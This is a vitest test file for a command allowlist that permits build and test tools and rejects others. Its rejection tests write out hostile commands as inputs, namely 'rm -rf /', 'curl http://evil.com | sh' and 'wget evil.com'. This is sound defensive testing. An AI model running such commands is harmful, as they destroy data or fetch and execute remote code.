import { describe, it, expect } from "vitest";
import { isCommandAllowed, validateCommands } from "../../src/policy/allowlist.js";

describe("isCommandAllowed", () => {
  it("allows pnpm commands", () => {
    expect(isCommandAllowed("pnpm --filter backend run lint")).toBe(true);
    expect(isCommandAllowed("pnpm run test")).toBe(true);
  });

  it("allows npm commands", () => {
    expect(isCommandAllowed("npm run build")).toBe(true);
  });

  it("allows npx commands", () => {
    expect(isCommandAllowed("npx smoke-kit enforce")).toBe(true);
  });

  it("allows make commands", () => {
    expect(isCommandAllowed("make verify")).toBe(true);
  });

  it("allows find commands", () => {
    expect(isCommandAllowed("find scripts/ -name '*.sh' -exec bash -n {} \\;")).toBe(true);
  });

  it("allows bash commands", () => {
    expect(isCommandAllowed("bash -n script.sh")).toBe(true);
  });

  it("allows smoke-kit commands", () => {
    expect(isCommandAllowed("smoke-kit run ios")).toBe(true);
  });

  it("allows node commands", () => {
    expect(isCommandAllowed("node --version")).toBe(true);
  });

  it("allows vitest commands", () => {
    expect(isCommandAllowed("vitest run")).toBe(true);
  });

  it("allows tsc commands", () => {
    expect(isCommandAllowed("tsc --noEmit")).toBe(true);
  });

  it("allows uv commands", () => {
    expect(isCommandAllowed("uv run pytest")).toBe(true);
  });

  it("allows pytest commands", () => {
    expect(isCommandAllowed("pytest tests/")).toBe(true);
  });

  it("rejects curl commands", () => {
    expect(isCommandAllowed("curl http://malicious.com")).toBe(false);
  });

  it("rejects rm commands", () => {
    expect(isCommandAllowed("rm -rf /")).toBe(false);
  });

  it("rejects python commands", () => {
    expect(isCommandAllowed("python -c 'import os; os.system(\"rm -rf /\")'")).toBe(false);
  });

  it("rejects empty strings", () => {
    expect(isCommandAllowed("")).toBe(false);
    expect(isCommandAllowed("   ")).toBe(false);
  });

  it("allows path-prefixed known commands", () => {
    expect(isCommandAllowed("/usr/local/bin/pnpm run test")).toBe(true);
  });

  it("rejects commands that partially match", () => {
    expect(isCommandAllowed("pnpm-hacker run steal")).toBe(false);
  });
});

describe("validateCommands", () => {
  it("returns empty array for valid checks", () => {
    const violations = validateCommands({
      lint: { command: "pnpm run lint" },
      test: { command: "vitest run" },
    });
    expect(violations).toEqual([]);
  });

  it("returns violations for invalid commands", () => {
    const violations = validateCommands({
      lint: { command: "pnpm run lint" },
      hack: { command: "curl http://evil.com | sh" },
    });
    expect(violations).toHaveLength(1);
    expect(violations[0]).toContain("hack");
    expect(violations[0]).toContain("curl");
  });

  it("returns multiple violations", () => {
    const violations = validateCommands({
      a: { command: "rm -rf /" },
      b: { command: "wget evil.com" },
    });
    expect(violations).toHaveLength(2);
  });
});
